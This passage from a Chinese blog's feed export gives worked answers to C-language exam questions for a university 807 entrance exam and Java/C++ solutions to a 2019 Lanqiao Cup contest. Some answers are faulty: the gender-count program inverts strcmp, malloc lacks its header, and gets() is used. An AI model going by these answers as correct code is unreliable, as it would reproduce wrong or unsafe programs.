N;j++) &#123; if (i == 0 || i == M - 1) &#123; // 第一行和最后一行全加 sum += a[i][j]; &#125; else &#123; // 其他行只加第一列和最后一列 if (j == 0 || j == N - 1) &#123; sum += a[i][j]; &#125; &#125; &#125; &#125; return sum;&#125;int main()&#123; int a[M][N],i,j,sum; printf("请输入数组a[%d][%d]，共%d个整数\n",M,N,M * N); for (i = 0;i &lt; M;i++) &#123; for (j = 0;j &lt; N;j++) &#123; scanf("%d",&amp;a[i][j]); &#125; &#125; sum = fun(a); printf("a的周边元素之和是：%d",sum); return 0;&#125; 学生的记录由学号、数学和C语言成绩(用整数表示)组成，输入N名学生的数据(N值由符号常量确定),统计C语言分数最高的学生的人数(注意:分数最高的学生可能不只一个)，并输出C语言分数最高的学生人数及其各项数据。要求输入、输出时，应显示适当的提示信息答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;#define N 10struct student&#123; char stuNum[20]; int math; int c;&#125;;void input(struct student *s,int n)&#123; int i; for (i = 0;i &lt; n;i++) &#123; printf("请输入第%d个学生的学号：",i + 1); scanf("%s",s[i].stuNum); printf("请输入第%d个学生的数学成绩：",i + 1); scanf("%d",&amp;s[i].math); printf("请输入第%d个学生的C语言成绩：",i + 1); scanf("%d",&amp;s[i].c); getchar();// 干掉残留的回车符，不然下次学号输入可能出错 &#125;&#125;int main()&#123; int m = 0,i,maxScore = 0; struct student stu[N],max[N]; printf("请输入学生信息：\n"); input(stu,N); for (i = 0;i &lt; N;i++) &#123; if (stu[i].c &gt; maxScore) &#123; maxScore = stu[i].c; &#125; &#125; for (i = 0;i &lt; N;i++) &#123; if (stu[i].c == maxScore) &#123; max[m++] = stu[i]; &#125; &#125; printf("统计结果：\n"); printf("C语言分数最高的学生人数是：%d\n",m); while (m-- &gt; 0) &#123; printf("学号：%s，数学成绩：%d，C语言成绩：%d\n",max[m].stuNum,max[m].math,max[m].c); &#125; return 0;&#125; 在主程序中输入10个字符串，调用sort函数进行冒泡排序，然后在主函数中输出排序结果，其中字符串长度不超过20，字符串排序方式(按字母序递增用1表示，按字母序递减用0表示)和待排序的字符串由参数传递给sort 函数。要求自行设计sort函数，在主函数中，输入、输出应有相应提示。答案： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 10#define M 20struct _string&#123; char *data;&#125;;void init(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; strs[i].data = (char *) malloc(sizeof(char) * M); &#125;&#125;void input(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; printf("请输入第%d个字符串：",i + 1); gets(strs[i].data); &#125;&#125;void print(struct _string strs[N]) &#123; int i; for (i = 0;i &lt; N;i++) &#123; printf("%s\n",strs[i].data); &#125;&#125;void retrieve(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; free(strs[i].data); &#125;&#125;void sort(struct _string strs[N],int m)&#123; int i,j; if (m == 1) &#123; for (i = 0;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (strcmp(strs[i].data,strs[j].data) &lt; 0) &#123; char *t = strs[j].data; strs[j].data = strs[i].data; strs[i].data = t; &#125; &#125; &#125; &#125; else if (m == 0) &#123; for (i = 0;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (strcmp(strs[i].data,strs[j].data) &gt; 0) &#123; char *t = strs[j].data; strs[j].data = strs[i].data; strs[i].data = t; &#125; &#125; &#125; &#125;&#125;int main()&#123; struct _string strs[N]; init(strs);// 申请动态空间 input(strs);// 输入 sort(strs,1);// 排序 printf("按字母序递增：\n"); print(strs);// 输出 printf("按字母序递减：\n"); sort(strs,0); print(strs); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2018年真题答案以及解析]]></title>
    <url>%2Fposts%2F29047cc4%2F</url>
    <content type="text"><![CDATA[单项选择题 设整型变量x，y的值分别为0，1, 那么x || y的结果是A. 0B. 1C. 2D. 都不对答案：B解析：x || y，意思是x或者y，含义是x，y只要有一个非0，值就为1（真） 变量的指针，其含义是指该变量的A. 值B. 名C. 地址D. 一个标志答案：C解析：变量的指针，指向的是该变量所在的内存地址；变量的值指得是该变量所对应内存单元中存的值；变量名代表变量的标志（标识符） C语言源程序文件后缀为A. .cB. .objC. .exeD. .cpp答案：A解析：.obj是C程序程序编译时生成的中间代码文件目标文件；.exe是Windows上的可执行文件；.cpp是C++源程序文件 下列语句不具有赋值功能的是A. x*=y;B. z=l;C. x++;D. x+y;答案：D解析：A可写为x = x * y；C可写为x = x + 1； 若在某程序中定义了多个函数，则以下说法中正确的是A. C语言程序总是从main()函数开始执行。B. 在C语言程序中，要调用的函数必须在main()函数中定义。C. C语言程序总是从第一个定义的函数开始执行。D. C语言程序中的main()函数必须放在程序的最后部分。答案：A解析：main()函数是C程序的入口，所以总是会从main()函数开始执行；B选项，要调用的函数只需要把声明放在main函数的前面即可；A选项对，C选项就肯定错了；D选项，main()可以放在程序的任何地方（除了其他定义、声明等的内部） for(表达式1;表达式2;表达式3)中，能省略的表达式有A. 表达式1B. 表达式2C. 表达式3D. 3个都可以答案：D解析：for循环中的三个表达式都可省略，此时是个死循环 判断字符串s1的长度是否等于字符串s2的长度，应使用A. if (sI == s2)B. if(strlen(s1) == strlen(s2))C. if(strcmp(s1,s2))D. if(strcat(s1) &gt; strcat(s2))答案：B解析：A选项在判断s1，s2地址是否相同；C选项在判断s1字符串是否大于s2字符串，这里比较的是字符串内容不是指针地址；D选项直接是非法的，strcat函数不是这么用的 以下语句的输出结果是:int a=100, b=100;printf(&quot;%d %d\n&quot;, --a, b++);A. 100 100B. 99 99C. 99 100D. 100 101答案：C解析：printf从右到左入栈，然后从左到右打印（看不懂就忽略前面，直接看后面），--、++运算符放前面，先运算后使用，放后面，先使用后运算，所以结果是99 100，打印完成之后，b的值变为101，a的值是99 在以下结构体数组定义中，正确的是A. struct student { int no; char name[20]; float score };B. struct stu[20] { int no; char name[20]; float score; }C. struct student { int no; char name[20]; float score; } stu[20];D. student { int no; char name[20];float score; } stu[20];答案：C解析：A选项只是定义了一个结构类型，没有定义数组；B选项不合法；D选项也不合法 输入两个字符数组a,b的正确语句是A. puts(a, b);B. scanf(“%s%s”,a, b);C. scanf(“%s%s” ,&amp;a, &amp;b);D. gets(“a”); gets(“b”);答案：B解析：A选项puts函数是输出；C选项错在&amp;，字符数组本身就是地址（指针常量），所以用不着，多此一举了；D选项非法，尝试输入到常量区 判断题 在C程序中，语句之间必须要用分号;分隔答案：×解析：类似如下情况，两条if语句之间并没有使用分号，而是通过语句块的形式分隔 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int a = 1; int b = 2; if (a == b) &#123; &#125; if (a &lt; b) &#123; &#125; return 0;&#125; C语言本身不提供输入输出语句，输入和输出操作是由函数来实现的答案：√解析：这是谭浩强的参考书上的原话 变量根据其作用域的范围可以分作全局变量和局部变量答案：√解析：全局变量的作用域是从定义的地方开始，到本文件结束；局部变量的作用域是从定义的地方开始，到语句块结束 C语言中可以使用如下语句定义数组: char a(10);答案：×解析：正确的定义方式应该使用方括号，char a[10]; 在C语言程序设计中，符号”/*“和”*/“ 之间的内容是C语言的注释答案：√解析：C语言中有两种注释方式，第一种是行注释”//“，从这两个斜杠开始，到本行结束；第二种是块注释，就是本题的这种 将数组a的首地址赋给指针变量p的语句是p=*a;答案：×解析：正确的语句是：p = a;但是需要注意的是，如果就按题目所说的方式写，编译器并不会报语法错误，而是在运行的过程中才会出现未知的错误，这种错误一般来说会导致程序崩溃 return 语句必须在每个函数中都出现答案：×解析；返回值类型为void（空类型）的函数中可以不出现，也可以出现，这种出现的情况，return语句不需要返回任何值，语义仅代表函数结束 C语言在执行循环嵌套语句时的顺序为，先执行内层循环再执行外层循环答案：×解析：先执行的肯定是外层循环，但是先执行结束的确是内层循环 一个指针变量可以指向不同类型的变量答案：√解析：指针变量确实可以指向不同类型的变量，但是这种情况下，有可能导致异常情况，建议不要使用；有一种可以使用的情况就是void *类型的指针变量，注意这里的void *代表的不是空指针类型，而是任意指针类型，也就是说，可以让这种类型的指针指向任何其他类型的变量，系统中的malloc函数的返回值类型就是这种通用的指针类型，这使得C程序变得更为的灵活 与if(E)语句中的(E) 等价的表达式是(E==0)答案：×解析：if(E)判断的是表达式E是否为0，如果不为0就执行，所以表达式为真的条件是E != 0 程序分析题 程序运行时，若输入以下字符串:This is a test program! 1230K描述程序的主要功能，并写出程序的运行结果 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char str[100]; int count[26] = &#123;0&#125;,i = 0; printf("请输入字符串:\n"); gets(str); while (str[i] != '\0') &#123; if (str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') count[str[i] - 'a']++; else if (str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') count[str[i] - 'A']++; i++; &#125; printf("统计结果为：\n"); for (i = 0;i &lt; 26;i++) &#123; if (count[i] != 0) &#123; printf("%c - %d\n",i + 'A',count[i]); &#125; &#125; return 0;&#125; 答案： 功能：输入一行字符串，不区分大小写字母，统计所有字母出现的次数，输出 输出结果： 12345678910111213统计结果为：A - 2E - 1G - 1H - 1I - 2K - 1M - 1O - 1P - 1R - 2S - 3T - 3 描述程序的主要功能，并写出程序的运行结果 123456789101112131415161718192021#include&lt;stdio.h&gt;int main()&#123; int max,min,i,j; struct student&#123; char name[10]; int score; &#125;; struct student stu[5] = &#123;"Liming",75,"Zhangling",89,"Wanghai",93,"Liuhong",62,"Zhaoqiang",85&#125;; max = min = 0; for (i = 0;i &lt; 5;i++) &#123; if (stu[i].score &gt; stu[max].score) max = i; else if (stu[i].score &lt; stu[min].score) min = i; &#125; printf("Max is:%s,%d\n",stu[max].name,stu[max].score); printf("Min is:%s,%d\n",stu[min].name,stu[min].score); return 0; &#125; 答案： 功能：找出5个数组元素中成绩值最大的和成绩值最小的学生，并将她们的全部信息输出 输出结果： 12Max is:Wanghai,93Min is:Liuhong,62 程序运行时，若输入以下数据:12345描述程序的主要功能，并写出程序的运行结果 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; unsigned int number; int d; printf("请输入一个正整数:"); scanf("%d",&amp;number); printf("result:"); do&#123; d = number % 10; printf("%d",d); number = number / 10; &#125;while(number != 0); return 0;&#125; 答案： 功能：输入一个正整数，将它倒序输出 输出结果：54321 程序设计题 编写程序，实现下列格式的乘法口诀表 1234567891*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 答案： 1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int i,j; for (i = 1;i &lt; 10;i++) &#123; for (j = 1;j &lt;= i;j++) &#123; printf("%d*%d=%d\t",i,j,i * j); &#125; printf("\n"); &#125; return 0;&#125; 从键盘输入100个人的姓名、性别和年龄，分别统计0-29岁、30-59岁、60以上的男、女人数答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 100#define Nan "男" #define Nv "女"struct people&#123; char name[20]; char sex[2]; int age;&#125; ps[N];int main()&#123; int i; int age0[2] = &#123;0&#125;; int age30[2] = &#123;0&#125;; int age60[2] = &#123;0&#125;; for (i = 0;i &lt; N;i++) &#123; printf("请输入第%d个人的信息：\n",i + 1); printf("请输入Ta的姓名（不超过10个汉字）："); scanf("%s",ps[i].name); getchar(); printf("请输入Ta的性别（男或者女）："); scanf("%s",ps[i].sex); printf("请输入Ta的年龄（整数）："); scanf("%d",&amp;ps[i].age); getchar(); &#125; for (i = 0;i &lt; N;i++) &#123; if (ps[i].age &gt;= 0 &amp;&amp; ps[i].age &lt; 30) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age0[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age0[1]++; &#125; &#125; if (ps[i].age &gt;= 30 &amp;&amp; ps[i].age &lt; 60) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age30[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age30[1]++; &#125; &#125; if (ps[i].age &gt;= 60) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age60[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age60[1]++; &#125; &#125; &#125; printf("统计结果：\n"); printf("0 ~ 29岁性别为男的人数为%d，0 ~ 29岁性别为女的人数为%d\n",age0[0],age0[1]); printf("30 ~ 59岁性别为男的人数为%d，30 ~ 59岁性别为女的人数为%d\n",age30[0],age30[1]); printf("60岁以上性别为男的人数为%d，60岁以上性别为女的人数为%d\n",age60[0],age60[1]); return 0;&#125; 从键盘上输入字符串1，将字符串I中除去数字字符’0’ ~ ‘9’之后的其它字符保留在字符串2中，开输出字符串2答案： 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#define N 100int main()&#123; int i = 0,j = 0; char str1[N]; char str2[N]; printf("请输入字符串（长度不超过%d个）",N); gets(str1); while (str1[i] != '\0') &#123; if (str1[i] &gt;= '0' &amp;&amp; str1[i] &lt;= '9') &#123; i++; continue; &#125; str2[j++] = str1[i]; i++; &#125; str2[j] = '\0'; printf("结果为：\n"); printf("%s\n",str2); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年第十一届蓝桥杯校内选拔赛JavaB组题解]]></title>
    <url>%2Fposts%2F4a4a9225%2F</url>
    <content type="text"><![CDATA[一共十个题，都比较好做 题目1 问题描述 在计算机存储中，15.125GB是多少MB？ 答案：15488思路：1GB=1024MB解题代码： java: 1234567891011package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo01 &#123; public static void main(String[] args) &#123; System.out.println(15.125 * 1024); &#125;&#125; c++: 12345678#include &lt;iostream&gt;using namespace std;int main() &#123; cout &lt;&lt; 15.125 * 1024 &lt;&lt; endl; return 0;&#125; 题目2 问题描述 不超过19000的正整数中，与19000互质的数的个数是多少？ 答案：7200思路：两个数互质，那么它们的最大公约数是1解题代码： java: 12345678910111213141516171819202122232425package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo02 &#123; public static void main(String[] args) &#123; int ans = 0; for (int i = 1;i &lt;= 19000;i++) &#123; if (gcd(i,19000) == 1) &#123; ans++; &#125; &#125; System.out.println(ans); &#125; private static int gcd(int a, int b) &#123; if (b == 0) &#123; return a; &#125; else &#123; return gcd(b,a % b); &#125; &#125;&#125; c++: 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int gcd(int a, int b) &#123; if (b == 0) &#123; return a; &#125; else &#123; return gcd(b, a % b); &#125;&#125;int main() &#123; int ans = 0; for (int i = 1; i &lt;= 19000; i++) &#123; if (gcd(i, 19000) == 1) &#123; ans++; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目3 问题描述 一个包含有2019个结点的二叉树，最少有多少层？ 注意当一棵二叉树只有一个结点时为一层。 答案：11思路：满二叉树层数最少，而满二叉树第一层节点数是1，第二层节点数是2，第三层节点数是4，，，以此类推，第n层节点数是2的n-1次方，于是这题目就变成了1+2+4+…+2n-1&gt;2019解题代码： java: 123456789101112131415161718192021package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo03 &#123; public static void main(String[] args) &#123; int a = 0; int d = 1;; for (int i = 0;i &lt; Integer.MAX_VALUE;i++) &#123; a += Math.pow(2, i); System.out.println(d + "," + a); if (a &gt;= 2019) &#123; break; &#125; d++; &#125; System.out.println(d); &#125;&#125; c++: 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main() &#123; int a = 0; int d = 1;; for (int i = 0; i &lt; INT_MAX; i++) &#123; a += pow(2, i);// cout &lt;&lt; d &lt;&lt; "," &lt;&lt; a &lt;&lt; endl; if (a &gt;= 2019) &#123; break; &#125; d++; &#125; cout &lt;&lt; d &lt;&lt; endl; return 0;&#125; 题目4 问题描述 由1对括号，可以组成一种合法括号序列：()。 由2对括号，可以组成两种合法括号序列：()()、(())。 由4对括号组成的合法括号序列一共有多少种？ 答案：14思路：对四对括号，先用回溯法全排列，然后set暴力去重，最后用stack验证是否合法代码： java: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package wiki.zimo.exam2019;import java.util.HashSet;import java.util.Stack;/*** * @author zimo**/public class Demo04 &#123; static HashSet&lt;String&gt; set = new HashSet&lt;String&gt;(); public static void main(String[] args) &#123; String s = "(((())))"; // 回溯法全排列，set暴力去重，stack验证是否合法 dfs(s.toCharArray(),0); int ans = 0; for (String str : set) &#123; if (judge(str)) &#123; ans++; System.out.println(str); &#125; &#125; System.out.println(ans); &#125; private static boolean judge(String str) &#123; Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; str.length();i++) &#123; char c = str.charAt(i); if (c == '(') &#123; stack.push(c); &#125; if (c == ')') &#123; if (stack.isEmpty()) &#123; return false; &#125; stack.pop(); &#125; &#125; return stack.isEmpty(); &#125; private static void dfs(char[] a, int b) &#123; if (b &gt;= a.length) &#123; String s = new String(a); set.add(s); &#125; for (int i = b;i &lt; a.length;i++) &#123; &#123;char t = a[i];a[i] = a[b];a[b] = t;&#125; dfs(a, b + 1); &#123;char t = a[i];a[i] = a[b];a[b] = t;&#125; &#125; &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;set&lt;string&gt; se;void dfs(string a, int b, int n) &#123; if (b &gt;= n) &#123; se.insert(a); &#125; for (int i = b; i &lt; n; i++) &#123; &#123; char t = a[i]; a[i] = a[b]; a[b] = t; &#125; dfs(a, b + 1, n); &#123; char t = a[i]; a[i] = a[b]; a[b] = t; &#125; &#125;&#125;bool judge(string str, int n) &#123; int left = 0; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str[i]; if (c == '(') &#123; left++; &#125; if (c == ')') &#123; if (left == 0) &#123; return false; &#125; left--; &#125; &#125; return left == 0;&#125;int main() &#123; string s = "(((())))"; dfs(s, 0, s.length()); int ans = 0; set&lt;string&gt;::iterator it; for (it = se.begin(); it != se.end(); it++) &#123; if (judge(*it, s.length())) &#123; cout &lt;&lt; *it &lt;&lt; endl; ans++; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目5 问题描述 在数列 a[1], a[2], …, a[n] 中，如果对于下标 i, j, k 满足 0&lt;i&lt;j&lt;k&lt;n+1 且 a[i]&lt;a[j]&lt;a[k]，则称 a[i], a[j], a[k] 为一组递增三元组，a[j]为递增三元组的中心。 给定一个数列，请问数列中有多少个元素可能是递增三元组的中心。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a[1], a[2], …, a[n]，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 5 1 2 5 3 5 样例输出 2 样例说明 a[2] 和 a[4] 可能是三元组的中心。 思路：暴力计数解题代码： java: 1234567891011121314151617181920212223242526272829303132package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo05 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; l:for (int j = i + 1;j &lt; n ;j++) &#123; for (int k = j + 1;k &lt; n;k++) &#123; if (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123; ans++; break l; &#125; &#125; &#125; &#125; System.out.println(ans); &#125;&#125; c++: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; bool flag = false; for (int k = j + 1; k &lt; n; k++) &#123; if (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123; ans++; flag = true; break; &#125; &#125; if (flag)&#123; break; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目6 问题描述 在数列 a_1, a_2, …, a_n中，如果 a_i 和 a_j 满足 i &lt; j 且 a_i &gt; a_j，则称为一个逆序数对。 给定一个数列，请问数列中总共有多少个逆序数对。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 6 3 1 5 2 3 5 样例输出 4 思路：暴力计数解题代码： java: 123456789101112131415161718192021222324252627282930package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo06 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; if (a[i] &gt; a[j]) &#123; ans++; &#125; &#125; &#125; System.out.println(ans); &#125;&#125; c++: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if (a[i] &gt; a[j]) &#123; ans++; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目7 问题描述 在数列 a_1, a_2, …, a_n中，定义两个元素 a_i 和 a_j 的距离为 |i-j|+|a_i-a_j|，即元素下标的距离加上元素值的差的绝对值，其中 |x| 表示 x 的绝对值。 给定一个数列，请问找出元素之间最大的元素距离。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 5 9 4 2 4 7 样例输出 9 样例说明 a_1 和 a_3 的距离为 |1-3|+|9-2|=9。 思路：暴力解题代码： java: 1234567891011121314151617181920212223242526272829package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo07 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; int dis = Math.abs(i - j) + Math.abs(a[i] - a[j]); ans = Math.max(dis, ans); &#125; &#125; System.out.println(ans); &#125;&#125; c++: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; int dis = abs(i - j) + abs(a[i] - a[j]); ans = max(dis, ans); &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目8 问题描述 小明有一块空地，他将这块空地划分为 n 行 m 列的小块，每行和每列的长度都为 1。 小明选了其中的一些小块空地，种上了草，其他小块仍然保持是空地。 这些草长得很快，每个月，草都会向外长出一些，如果一个小块种了草，则它将向自己的上、下、左、右四小块空地扩展，这四小块空地都将变为有草的小块。 请告诉小明，k 个月后空地上哪些地方有草。 输入格式 输入的第一行包含两个整数 n, m。 接下来 n 行，每行包含 m 个字母，表示初始的空地状态，字母之间没有空格。如果为小数点，表示为空地，如果字母为 g，表示种了草。 接下来包含一个整数 k。 输出格式 输出 n 行，每行包含 m 个字母，表示 k 个月后空地的状态。如果为小数点，表示为空地，如果字母为 g，表示长了草。 样例输入 4 5 .g… ….. ..g.. ….. 2 样例输出 gggg. gggg. ggggg .ggg. 思路：按时刻更新空地即可解题代码： java: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package wiki.zimo.exam2019;import java.util.ArrayList;import java.util.List;import java.util.Scanner;/*** * @author zimo**/public class Demo08 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int m = input.nextInt(); // 干掉回车符 input.nextLine(); char map[][] = new char[n][m]; for (int i = 0;i &lt; n;i++) &#123; map[i] = input.nextLine().toCharArray(); &#125; int k = input.nextInt(); for (int i = 0;i &lt; k;i++) &#123; List&lt;Integer&gt; xs = new ArrayList&lt;Integer&gt;(); List&lt;Integer&gt; ys = new ArrayList&lt;Integer&gt;(); for (int x = 0;x &lt; n;x++) &#123; for (int y = 0;y &lt; m;y++) &#123; if (map[x][y] == 'g') &#123; xs.add(x); ys.add(y); &#125; &#125; &#125; for (int j = 0;j &lt; xs.size();j++) &#123; dfs(map, xs.get(j), ys.get(j)); &#125; xs.clear(); ys.clear(); &#125; print(map, n, m); &#125; private static void print(char map[][],int n,int m) &#123; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; m;j++) &#123; System.out.print(map[i][j]); &#125; System.out.println(); &#125; System.out.println(); &#125; private static void dfs(char[][] map,int x,int y) &#123; if (x - 1 &gt;= 0 &amp;&amp; map[x - 1][y] == '.') &#123; map[x - 1][y] = 'g'; &#125; if (x + 1 &lt; map.length &amp;&amp; map[x + 1][y] == '.') &#123; map[x + 1][y] = 'g'; &#125; if (y - 1 &gt;= 0 &amp;&amp; map[x][y - 1] == '.') &#123; map[x][y - 1] = 'g'; &#125; if (y + 1 &lt; map[x].length &amp;&amp; map[x][y + 1] == '.') &#123; map[x][y + 1] = 'g'; &#125; &#125;&#125; c++: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;#define N 100#define M 100int n = 0, m = 0;void dfs(char map[N][M], int x, int y) &#123; if (x - 1 &gt;= 0 &amp;&amp; map[x - 1][y] == '.') &#123; map[x - 1][y] = 'g'; &#125; if (x + 1 &lt; n &amp;&amp; map[x + 1][y] == '.') &#123; map[x + 1][y] = 'g'; &#125; if (y - 1 &gt;= 0 &amp;&amp; map[x][y - 1] == '.') &#123; map[x][y - 1] = 'g'; &#125; if (y + 1 &lt; m &amp;&amp; map[x][y + 1] == '.') &#123; map[x][y + 1] = 'g'; &#125;&#125;void print(char map[N][M]) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; m; j++) &#123; cout &lt;&lt; map[i][j]; &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125;int main() &#123; int k = 0; cin &gt;&gt; n &gt;&gt; m; char map[N][M]; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; m; j++) &#123; cin &gt;&gt; map[i][j]; &#125; &#125; cin &gt;&gt; k; for (int i = 0; i &lt; k; i++) &#123; vector&lt;int&gt; xs; vector&lt;int&gt; ys; for (int x = 0; x &lt; n; x++) &#123; for (int y = 0; y &lt; m; y++) &#123; if (map[x][y] == 'g') &#123; xs.push_back(x); ys.push_back(y); &#125; &#125; &#125; for (int j = 0; j &lt; xs.size(); j++) &#123; dfs(map, xs[j], ys[j]); &#125; xs.clear(); ys.clear(); &#125; print(map); return 0;&#125; 题目9 问题描述 小明想知道，满足以下条件的正整数序列的数量： 1. 第一项为 n； 2. 第二项不超过 n； 3. 从第三项开始，每一项小于前两项的差的绝对值。 请计算，对于给定的 n，有多少种满足条件的序列。 输入格式 输入一行包含一个整数 n。 输出格式 输出一个整数，表示答案。答案可能很大，请输出答案除以10000的余数。 样例输入 4 样例输出 7 样例说明 以下是满足条件的序列： 4 1 4 1 1 4 1 2 4 2 4 2 1 4 3 4 4 思路：改版的斐波那契数列，经典的递归回溯问题，动态规划问题（博主能力有限，动态规划解法没做出来，回溯法可以得部分分）解题代码： java: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package wiki.zimo.exam2019;import java.util.*;/*** * @author zimo**/public class Demo09 &#123; static int ans = 0; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); if (n &lt;= 1) &#123; System.out.println(1); return; &#125; int a[] = new int[n]; a[0] = n; // 第一项是n for (int i = 1;i &lt;= n;i++) &#123; a[1] = i;// 第二项有n种 dfs(a,2);// 从第三项开始每一项都跟前两项有关 &#125; System.out.println(ans % 10000); &#125; private static void dfs(int a[],int n) &#123;// System.out.println(Arrays.toString(a)); print(a); ans++; int abs = Math.abs(a[n - 1] - a[n - 2]); for (int i = 1;i &lt; abs;i++) &#123; a[n] = i; dfs(a,n + 1); for (int j = n;j 